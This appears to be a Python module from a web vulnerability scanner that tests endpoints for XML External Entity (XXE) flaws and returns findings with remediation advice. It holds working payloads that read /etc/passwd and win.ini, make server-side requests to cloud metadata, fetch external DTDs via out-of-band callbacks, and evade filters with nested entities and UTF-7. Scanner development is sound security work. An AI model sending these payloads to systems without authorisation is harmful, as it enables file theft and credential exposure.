"""
XXE (XML External Entity) detection engine.

Detection strategies:
1. Direct file read: inject entity referencing file:///etc/passwd
2. Parameter entity OOB: external DTD fetch via OAST server
3. XInclude: for applications that embed user XML into a larger document
4. Blind XXE via error: force parser errors that leak file content

All blind detection relies on the OAST callback server.
"""
from __future__ import annotations

import re
from typing import Optional

import structlog

from nightfall.core.http import Evidence

logger = structlog.get_logger(__name__)


# ── XXE Payload Templates ───────────────────────────────────────────────────

XXE_PAYLOADS = [
    # Standard entity — direct file read
    {
        "name": "basic-file-read",
        "payload": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        "signal": "file-content",
    },
    # Windows file read
    {
        "name": "windows-file-read",
        "payload": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
        "signal": "file-content",
    },
    # Parameter entity — external DTD fetch (blind via OAST)
    {
        "name": "param-entity-oob",
        "payload": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "http://{nonce}.{oast}/dtd">%ext;]><r/>',
        "signal": "oob",
    },
    # Nested parameter entity — beats filters on % and <!ENTITY
    {
        "name": "nested-param-entity",
        "payload": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM \'http://{nonce}.{oast}/dtd\'>">%a;%b;]><r/>',
        "signal": "oob",
    },
    # XInclude — for partial XML injection
    {
        "name": "xinclude",
        "payload": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        "signal": "file-content",
    },
    # PHP filter — base64 encoded file content
    {
        "name": "php-filter",
        "payload": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&xxe;</r>',
        "signal": "base64-content",
    },
    # SSRF via XXE
    {
        "name": "xxe-ssrf",
        "payload": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>',
        "signal": "metadata",
    },
    # UTF-7 encoding bypass
    {
        "name": "utf7-bypass",
        "payload": '<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE r +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-r+AD4-+ACY-xxe+ADs-+ADw-/r+AD4-',
        "signal": "file-content",
    },
]

# File content markers that confirm successful file read
FILE_CONTENT_MARKERS = re.compile(
    r"(root:.*:0:0:|/bin/(bash|sh)|/etc/(passwd|shadow|hosts|hostname)|"
    r"\[boot loader\]|\[operating systems\]|\[fonts\]|"
    r"for 16-bit app support|; for 16-bit app support|"
    r"daemon:.*:/usr/sbin|www-data:.*:/var/www)",
    re.I,
)

# Base64-encoded file content markers
BASE64_FILE_MARKERS = re.compile(
    r"(cm9vd|L2Jpbi|ZGFlbW9u)",  # base64 fragments of "root", "/bin", "daemon"
)


async def xxe_engine(ctx, step: dict, obj) -> Optional[Evidence]:
    """XXE detection pipeline.

    1. Detect if the endpoint accepts XML (Content-Type or body analysis)
    2. Send file-read payloads and check for file content in response
    3. Send OOB payloads and check for OAST callbacks
    4. Try XInclude for partial XML injection scenarios
    """
    url = step.get("endpoint", "")
    method = step.get("method", "POST")
    original_body = step.get("body", "")

    # Detect if endpoint accepts XML
    content_type = step.get("content_type", "")
    is_xml_endpoint = (
        "xml" in content_type.lower()
        or original_body.strip().startswith("<")
        or "application/xml" in str(step)
    )

    if not is_xml_endpoint:
        # Try sending XML anyway — some endpoints accept it without advertising
        probe_ev = await ctx.pool.send(
            method, url,
            content='<?xml version="1.0"?><test>probe</test>',
            headers={"Content-Type": "application/xml"},
        )
        if probe_ev.response_status in (200, 201, 202, 204, 400):
            is_xml_endpoint = True
        else:
            logger.debug("xxe_not_xml_endpoint", url=url, status=probe_ev.response_status)
            return None

    logger.info("xxe_testing", url=url, method=method)

    # ── Test each payload ────────────────────────────────────────────────
    for payload_info in XXE_PAYLOADS:
        payload = payload_info["payload"]
        signal_type = payload_info["signal"]
        nonce = None

        # Inject OAST nonce for OOB payloads
        if "{nonce}" in payload and ctx.oast:
            nonce = ctx.oast.nonce()
            payload = payload.replace("{nonce}", nonce).replace("{oast}", ctx.oast.domain)
        elif "{nonce}" in payload:
            continue  # skip OOB payloads if OAST not available

        ev = await ctx.pool.send(
            method, url,
            content=payload,
            headers={"Content-Type": "application/xml"},
        )

        # Check for direct file content
        if signal_type == "file-content":
            if FILE_CONTENT_MARKERS.search(ev.response_body):
                ev.vuln_class = "xxe"
                ev.subtype = "file-read"
                ev.payload = payload_info["name"]
                ev.confidence = 0.95
                ev.severity = "critical"
                ev.evidence_snip = ev.response_body[:500]
                ev.remediation = (
                    "Disable DTD processing and external entity resolution. "
                    "Use defusedxml or equivalent safe XML parser. "
                    "Set XMLReader features: disallow-doctype-decl=true, "
                    "external-general-entities=false, external-parameter-entities=false."
                )
                logger.info("xxe_file_read_confirmed", url=url, payload=payload_info["name"])
                return ev

        # Check for base64-encoded file content
        if signal_type == "base64-content":
            if BASE64_FILE_MARKERS.search(ev.response_body):
                ev.vuln_class = "xxe"
                ev.subtype = "file-read-base64"
                ev.payload = payload_info["name"]
                ev.confidence = 0.9
                ev.severity = "critical"
                ev.evidence_snip = ev.response_body[:500]
                ev.remediation = "Disable DTD processing. Use safe XML parser."
                return ev

        # Check for metadata (SSRF via XXE)
        if signal_type == "metadata":
            if re.search(r"(ami-id|instance-id|iam|compute)", ev.response_body, re.I):
                ev.vuln_class = "xxe"
                ev.subtype = "ssrf-via-xxe"
                ev.payload = payload_info["name"]
                ev.confidence = 0.9
                ev.severity = "critical"
                ev.evidence_snip = ev.response_body[:500]
                ev.remediation = "Disable external entity processing in XML parser."
                return ev

        # Check for OOB callback
        if signal_type == "oob" and nonce and ctx.oast:
            if await ctx.oast.poll(nonce, timeout=8):
                ev.vuln_class = "xxe"
                ev.subtype = "blind-oob"
                ev.oob_nonce = nonce
                ev.payload = payload_info["name"]
                ev.confidence = 0.9
                ev.severity = "high"
                ev.evidence_snip = f"OOB callback received for nonce {nonce}"
                ev.remediation = "Disable DTD processing and external entity resolution."
                logger.info("xxe_oob_confirmed", url=url, nonce=nonce, payload=payload_info["name"])
                return ev

            # Also check HTTP-specific callback (external DTD fetch)
            if await ctx.oast.poll_http(nonce, timeout=2):
                ev.vuln_class = "xxe"
                ev.subtype = "blind-dtd-fetch"
                ev.oob_nonce = nonce
                ev.payload = payload_info["name"]
                ev.confidence = 0.85
                ev.severity = "high"
                ev.evidence_snip = f"External DTD fetch detected for nonce {nonce}"
                ev.remediation = "Disable external DTD loading in the XML parser."
                return ev

    logger.debug("xxe_no_signal", url=url)
    return None
